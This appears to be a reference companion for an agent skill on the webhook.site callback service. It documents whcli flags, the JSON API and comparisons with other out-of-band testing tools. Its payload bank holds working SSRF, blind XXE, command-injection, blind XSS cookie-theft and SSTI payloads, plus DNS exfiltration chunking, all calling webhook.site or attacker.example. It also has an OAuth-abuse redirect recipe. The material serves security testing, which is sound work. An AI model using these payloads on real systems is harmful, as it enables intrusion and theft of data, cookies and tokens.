# webhook.site Usage Matrix

Reference companion to `SKILL.md`. Load when you need the full `whcli` flag surface, JSON API map, OAST payload bank, Custom Action recipes, or a side-by-side comparison with related OAST/tunneling tools.

## Table of Contents

1. `whcli` command and flag matrix
2. Environment variables consumed by `whcli`
3. JSON API endpoint reference
4. OAST payload bank by vulnerability class
5. Custom Action recipes
6. Comparison vs related OAST / callback tools

---

## 1. `whcli` Command and Flag Matrix

### `whcli forward`

Streams every request captured by a token to a local target (or just to stdout). Long-polls / websockets against `https://webhook.site`.

| Flag | Env equivalent | Default | Purpose |
|---|---|---|---|
| `--token=<UUID>` | `WH_TOKEN` | required | Token UUID to subscribe to. |
| `--target=<URL>` | `WH_TARGET` | none (stdout only) | Local URL each request is replayed against. Method, headers, and body are preserved. |
| `--api-key=<KEY>` | `WH_API_KEY` | optional | Account API key. Needed for private tokens, higher rate limits, and protected tokens. |
| `--listen-timeout=<SECONDS>` | `WH_LISTEN_TIMEOUT` | 30 | Server-side long-poll timeout per cycle; bump up for high-latency networks. |
| `--keep-url` | — | off | Preserve the original request URL path/query when replaying to `--target` (default rewrites to root). |
| `--query=<KEY=VAL>` | `WH_QUERY` | none | Only forward requests whose query string matches. Filters scanner noise. |

### `whcli exec`

Runs a local command per captured request. The raw request body is piped to the command's stdin; selected metadata is exposed via environment variables.

| Flag | Env equivalent | Default | Purpose |
|---|---|---|---|
| `--token=<UUID>` | `WH_TOKEN` | required | Token UUID to subscribe to. |
| `--command=<CMD>` | `WH_COMMAND` | required | Shell command to spawn per request. |
| `--api-key=<KEY>` | `WH_API_KEY` | optional | Same role as for `forward`. |

Env vars injected into each spawned command include: `WH_REQUEST_ID`, `WH_METHOD`, `WH_URL`, `WH_IP`, `WH_USER_AGENT`, `WH_CONTENT_TYPE`, plus any `WH_HEADER_<NAME>` for received headers.

### Global

| Flag | Purpose |
|---|---|
| `--help`, `-h` | Per-command help. |
| `--version`, `-v` | Print version. |
| `WH_LOG_LEVEL=debug` (env) | Verbose logs (websocket frames, retry decisions). |
| `NODE_TLS_REJECT_UNAUTHORIZED=0` (env) | Disable TLS verification — only for self-signed self-hosted webhook.site instances. Never use against the public service. |

## 2. Environment Variables Consumed by `whcli`

```env
WH_TOKEN=                # default token UUID
WH_API_KEY=              # account API key
WH_TARGET=               # default forward target
WH_LISTEN_TIMEOUT=30
WH_QUERY=                # filter
WH_COMMAND=              # for `exec`
WH_LOG_LEVEL=info        # debug|info|warn|error
NODE_TLS_REJECT_UNAUTHORIZED=1
```

Prefer env vars over flags in shared shells so the API key never lands in `ps`/`history`.

## 3. JSON API Endpoint Reference

Base URL: `https://webhook.site`. Header: `Api-Key: <KEY>` (required for write/private actions; many read endpoints accept anonymous calls subject to rate limits).

| Method | Path | Purpose |
|---|---|---|
| `POST` | `/token` | Create a new token. JSON body fields include `default_status`, `default_content`, `default_content_type`, `timeout`, `cors`, `expiry`, `password`, `actions` (true/false). Returns `uuid`, `alias`, dashboard URL. |
| `GET` | `/token/<UUID>` | Get token metadata. |
| `PUT` | `/token/<UUID>` | Update token settings (default response, password, etc.). |
| `DELETE` | `/token/<UUID>` | Delete the token (and all requests). |
| `GET` | `/token/<UUID>/requests` | Paginated request list. Query: `sorting=newest|oldest`, `per_page=N`, `page=N`, `query=`, `date_from=`, `date_to=`. |
| `GET` | `/token/<UUID>/request/<REQ_UUID>` | Single request (parsed). |
| `GET` | `/token/<UUID>/request/<REQ_UUID>/raw` | Raw request body. |
| `DELETE` | `/token/<UUID>/request` | Purge all requests for a token. |
| `DELETE` | `/token/<UUID>/request/<REQ_UUID>` | Delete one request. |
| `GET` | `/token/<UUID>/stats` | Counters (request count, last seen, etc.). |
| `GET` | `/token/<UUID>/actions` | List Custom Actions (paid). |
| `POST` | `/token/<UUID>/actions` | Create a Custom Action. |
| `PUT` | `/token/<UUID>/actions/<ACTION_ID>` | Update a Custom Action. |
| `DELETE` | `/token/<UUID>/actions/<ACTION_ID>` | Delete a Custom Action. |
| `GET` | `/account` | Current account info (with `Api-Key`). |

Notes:

- The body of every captured request is also a permanent URL: `https://webhook.site/<UUID>/<REQ_UUID>` (the same path the target hit), useful when chaining captures into pipelines.
- DNSHook captures are exposed in the same `/requests` list as records with type=`dns`.

## 4. OAST Payload Bank

### 4.1 HTTP / SSRF

```http
GET /api/fetch?url=https://webhook.site/<UUID>/ssrf?marker=<HOST>-<PARAM>
GET /api/preview?u=http://<UUID>.webhook.site/ssrf
POST /api/import {"source":"https://webhook.site/<UUID>/csv?from=<MARKER>"}
```

Include host/param/timestamp markers in the path/query to attribute callbacks at scale.

### 4.2 Blind XXE (HTTP egress)

`malicious.dtd` on attacker server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'https://webhook.site/<UUID>/?leak=%file;'>">
%eval; %ex;
```

`payload.xml` consumed by the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % p SYSTEM "https://attacker.example/malicious.dtd"> %p; ]>
<r>x</r>
```

### 4.3 Blind XXE (DNS only)

```xml
<!DOCTYPE r [
  <!ENTITY % f SYSTEM "file:///etc/hostname">
  <!ENTITY % e "<!ENTITY &#x25; x SYSTEM 'http://%f;.<id>.dnshook.site/'>">
  %e; %x;
]>
<r>x</r>
```

`<id>` is the dnshook portion shown on the token's "DNSHook" tab.

### 4.4 Blind RCE / cmd injection

```bash
# HTTP egress
; curl -s https://webhook.site/<UUID>/$(whoami)-$(hostname)
# DNS egress only
$(nslookup $(hostname -s | tr A-Z a-z).<id>.dnshook.site)
# Windows
& certutil -urlcache -split -f https://webhook.site/<UUID>/win
```

### 4.5 Blind XSS

```html
<script>
fetch('https://webhook.site/<UUID>/x?l='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie),
      {credentials:'include',mode:'no-cors'});
</script>
```

For DOM/screenshot evidence prefer XSS Hunter; webhook.site captures the fetch beacon and headers cleanly enough for confirmation.

### 4.6 SSTI sanity (Jinja2 example — lab only)

```text
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__builtins__']['__import__']('os').popen('curl -s https://webhook.site/<UUID>?ok').read() }}
```

### 4.7 OAuth / SAML redirect inspection

- Set `redirect_uri=https://webhook.site/<UUID>` and walk the flow; the access code / id_token lands in the query of the captured request.
- For SAML, set `RelayState` or ACS URL to the token URL to capture the SAMLResponse body.

### 4.8 DNS exfil chunking

```text
<chunk1>.<chunk2>.<id>.dnshook.site
```

- Labels ≤ 63 chars; total FQDN ≤ 253 chars.
- Use base32 (lowercase, strip padding) — DNS-safe and case-insensitive.
- Include a unique probe ID per chunk to reassemble out-of-order captures.

## 5. Custom Action Recipes (paid)

### 5.1 Always return 302 to attacker-controlled URL (OAuth abuse PoC)

- Trigger: any request.
- Action: `Set response` → status 302, header `Location: https://attacker.example/cb?code=<MARKER>`.

### 5.2 Forward only authenticated callbacks to internal collector

- Trigger: request where header `X-Engagement` equals `<SECRET>`.
- Action: `Forward` → `https://collector.internal/webhook`.
- Action: `Set response` → 200 `{"ok":true}`.

### 5.3 Differentiate scanner noise from real callbacks

- Condition: query `op=cb` present.
  - Action: forward to internal collector, return JSON `{"ok":true}`.
- Else:
  - Action: return 404.

### 5.4 Strip and rehost a payload body

- Trigger: POST with `Content-Type: application/json`.
- Action: `Modify` → JSONPath `$.cookies` → null.
- Action: `Forward` → internal sink with sanitized body.

## 6. Comparison vs Related OAST / Callback Tools

| Tool | Channels | Hosted | Self-host | Pros | Cons |
|---|---|---|---|---|---|
| **webhook.site** | HTTP, DNS (DNSHook), email | yes | yes (open-source) | Full request UI, Custom Actions, JSON API, `whcli` forward/exec, instant setup. | Third-party SaaS by default; free tier capped at 100 req / 7-day expiry; not stealthy. |
| **interactsh** | HTTP, DNS, SMTP, LDAP | oast.pro, oast.fun | yes | Multi-protocol, self-host trivial, ProjectDiscovery ecosystem integration. | No request inspector UI by default — relies on `interactsh-client` or third-party UIs. |
| **XSS Hunter (Express)** | HTTP via JS payload | xsshunter.com / self-host | yes | DOM snapshot, screenshot, full execution context for XSS. | XSS-only; heavier setup. |
| **RequestBin (Pipedream)** | HTTP | yes | yes | Workflow integration on Pipedream platform. | No DNS, fewer offensive features. |
| **Burp Collaborator** | HTTP, DNS, SMTP | Burp Pro | enterprise | Tight Burp integration, polling for blind issues. | Burp Pro license required for hosted collaborator; self-host complex. |
| **bore + nc/tcpdump** | raw TCP | bore.pub | yes | Captures any TCP protocol, including binary. | No UI, no correlation, no DNS, no parsing. |
| **pinggy / ngrok** | HTTP, TCP, TLS | yes | SaaS | HTTPS to a real local app with debugger and rewrite. | Not OAST — designed to expose a long-lived service, not collect one-shot callbacks. |

Decision shortcut:

- Need fast HTTP + DNS callback with a UI → **webhook.site**.
- Need DNS / SMTP / LDAP / multi-protocol OAST → **interactsh**.
- Need DOM/screenshot evidence for XSS → **XSS Hunter**.
- Need to expose a real local app, not collect callbacks → **pinggy / ngrok / bore** depending on layer.
